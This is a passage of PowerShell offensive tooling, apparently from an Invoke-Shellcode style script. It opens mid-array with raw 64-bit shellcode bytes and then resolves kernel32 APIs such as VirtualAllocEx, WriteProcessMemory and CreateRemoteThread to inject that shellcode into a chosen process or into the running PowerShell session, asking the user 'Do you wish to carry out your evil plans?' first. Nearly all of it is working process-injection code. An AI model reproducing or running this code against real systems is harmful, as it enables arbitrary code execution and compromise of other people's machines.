$Shellcode64 += 0xfb,0xca,0x8b,0xe,0x51,0x59,0x49,0xd,0x65,0x74
$Shellcode64 += 0xe4,0xf1,0x89,0xb3,0xfe,0x7b,0x49,0x78,0x6f,0x86
$Shellcode64 += 0x28,0xba,0xd3,0xcc,0x15,0xcc,0x1f,0xfc,0x14,0x67
$Shellcode64 += 0x3a,0x65,0x63,0xe0,0x16,0xcf,0x99,0xc3,0x88,0x43
$Shellcode64 += 0xdd,0x8f,0x2b,0x28,0x2d,0xea,0xfe,0x51,0xd4,0xb4
$Shellcode64 += 0x9a,0xf6,0x62,0x8b,0x1,0xcc,0x1f,0xd9,0x4e,0xe
$Shellcode64 += 0xe9,0x69,0x4c,0xb5,0x55,0x5f,0x5a,0x7,0x38,0xc3
$Shellcode64 += 0x88,0x7d,0xdd,0x8f,0x5c,0x9f,0xa8,0xd4,0xfe,0x51
$Shellcode64 += 0xd4,0xb6,0x9a,0x66,0x3e,0x2,0xf7,0xee,0xdc,0x74
$Shellcode64 += 0x7,0x2e,0x60,0x9b,0x1,0x84,0xdd,0x6d,0x16,0xcf
$Shellcode64 += 0x92,0xc3,0x30,0x4d,0xdd,0x8f,0x6,0xe2,0x33,0x6e
$Shellcode64 += 0xfe,0x51,0xd4,0xbc,0x9d,0xf,0xe9,0x4c,0x4c,0xb5
$Shellcode64 += 0x55,0x7c,0xd7,0xb6,0x28,0x2,0xdb,0xcc,0x15,0xcc
$Shellcode64 += 0x1f,0xfc,0x62,0x52,0xc9,0xdb,0x63,0xe0,0x16,0x47
$Shellcode64 += 0xa3,0xc3,0x28,0x42,0xd4,0xb0,0xa8,0x33,0x81,0xca
$Shellcode64 += 0xfe,0x63,0xc4,0x35,0x5e,0x46,0x60
    }

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Inject shellcode into the specified process ID
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
        Write-Verbose "Injecting shellcode into PID: $ProcessId"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
        {
            Inject-RemoteShellcode $ProcessId
        }
    }
    else
    {
        # Inject shellcode into the currently running PowerShell process
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        
        Write-Verbose "Injecting shellcode into PowerShell"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode into the running PowerShell process!" ) )
        {
            Inject-LocalShellcode
        }
    }   
}
